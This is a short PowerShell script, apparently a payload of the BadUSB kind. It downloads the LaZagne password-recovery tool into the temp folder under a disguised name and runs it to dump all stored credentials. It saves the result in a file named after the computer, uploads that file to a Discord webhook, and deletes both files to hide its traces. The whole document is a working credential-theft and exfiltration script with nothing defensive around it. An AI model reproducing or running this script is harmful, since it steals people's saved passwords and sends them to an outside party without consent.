$T=$env:TEMP
$OutFile="$T\l.exe"
Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -OutFile $OutFile
Start-Sleep -s 2
$output = & "$OutFile" all -vv
$File = "$T\$env:COMPUTERNAME.txt"
$output | Out-File $File
Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1366126236455407616/wHyn4EgoxcqTd8oJaxYeu6yowiF8fXhsJA69OvobS0uu4OBT74OEx_wTvImoIJ34qX5X" -Method Post -InFile $File -ContentType "multipart/form-data"
Remove-Item $OutFile, $File -Force -ErrorAction SilentlyContinue
